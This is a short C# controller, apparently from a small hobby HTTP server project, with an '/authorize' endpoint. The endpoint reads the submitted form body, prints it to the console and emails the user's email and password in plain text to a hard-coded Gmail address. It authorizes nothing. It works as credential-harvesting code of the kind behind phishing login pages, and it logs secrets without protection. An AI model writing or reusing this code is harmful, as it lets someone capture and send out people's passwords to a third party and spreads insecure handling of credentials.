using System.Net;

namespace MyHTTPServer.Contollers;

[HttpController("/authorize")]
public class AuthorizeController
{
    public async void SendToEmail(HttpListenerContext context)
    {
        var stream = new StreamReader(context.Request.InputStream);
        var input = await stream.ReadToEndAsync();

        var sender = ConfigLoader.EmailSender;
        Console.WriteLine(input);
        string[] parsedInput = input.Split(new[] { '&', '=' });
        await sender.SendEmailAsync("eminsarux.rik79@gmail.com", "test",
            $"email: {parsedInput[1]}, password: {parsedInput[3]}");
    }
}